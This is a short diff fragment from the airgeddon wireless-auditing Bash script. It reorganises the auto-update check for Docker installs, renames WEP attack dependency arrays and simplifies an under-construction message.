 	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
-		if [ "${update_toolsok}" -eq 1 ]; then
-			autoupdate_check
-		else
-			echo
-			language_strings "${language}" 225 "yellow"
-			language_strings "${language}" 115 "read"
-		fi
-	else
 		if [ "${is_docker}" -eq 1 ]; then
 			echo
 			language_strings "${language}" 422 "blue"
 			language_strings "${language}" 115 "read"
+		else
+			if [ "${update_toolsok}" -eq 1 ]; then
+				autoupdate_check
+			else
+				echo
+				language_strings "${language}" 225 "yellow"
+				language_strings "${language}" 115 "read"
+			fi
 		fi
 	fi
 }
@@ -17113,7 +17192,8 @@ function remove_warnings() {
 	echo "${reaver_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${bully_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${reaver_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
-	echo "${wep_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${wep_attack_allinone_dependencies[@]}" > /dev/null 2>&1
+	echo "${wep_attack_besside_dependencies[@]}" > /dev/null 2>&1
 	echo "${enterprise_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${asleap_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${john_attacks_dependencies[@]}" > /dev/null 2>&1
@@ -17166,9 +17246,8 @@ function under_construction_message() {
 
 	debug_print
 
-	local var_uc="${under_constructionvar^}"
 	echo
-	echo_red "${var_uc}..."
+	echo_red "${under_construction[$language]^}..."
 	language_strings "${language}" 115 "read"
 }
 
